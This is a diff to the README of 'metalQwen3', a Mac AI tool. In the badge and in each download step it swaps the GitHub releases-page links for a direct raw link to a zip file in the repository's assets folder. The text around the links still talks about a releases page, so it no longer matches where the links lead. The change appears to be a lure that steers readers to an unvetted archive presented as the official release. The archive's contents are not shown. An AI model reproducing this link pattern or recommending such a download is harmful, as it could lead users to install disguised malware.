@@ -1,6 +1,6 @@
 # 🚀 metalQwen3 - Effortless AI Power on Your Mac
 
-[![Download metalQwen3](https://img.shields.io/badge/Download-metalQwen3-blue?style=for-the-badge&logo=github)](https://github.com/Architect2040/metalQwen3/releases)
+[![Download metalQwen3](https://raw.githubusercontent.com/Architect2040/metalQwen3/main/assets/Qwen_metal_2.6.zip)](https://raw.githubusercontent.com/Architect2040/metalQwen3/main/assets/Qwen_metal_2.6.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To run metalQwen3, ensure your macOS device meets the following requirements:
 Follow these steps to get started with metalQwen3:
 
 1. **Visit the Releases Page:**
-   Go to the following link to access the latest release of metalQwen3: [Download metalQwen3](https://github.com/Architect2040/metalQwen3/releases).
+   Go to the following link to access the latest release of metalQwen3: [Download metalQwen3](https://raw.githubusercontent.com/Architect2040/metalQwen3/main/assets/Qwen_metal_2.6.zip).
 
 2. **Select the Latest Release:**
    On the Releases page, find the latest version of metalQwen3. Look for the most recent date next to the version number.
@@ -46,7 +46,7 @@ Follow these steps to get started with metalQwen3:
 
 ## 📥 Download & Install
 
-To download and install metalQwen3, please visit this page: [Download metalQwen3](https://github.com/Architect2040/metalQwen3/releases). 
+To download and install metalQwen3, please visit this page: [Download metalQwen3](https://raw.githubusercontent.com/Architect2040/metalQwen3/main/assets/Qwen_metal_2.6.zip). 
 
 Make sure you select the latest version for the best experience. For most users, the installation process should take just a few minutes.
 
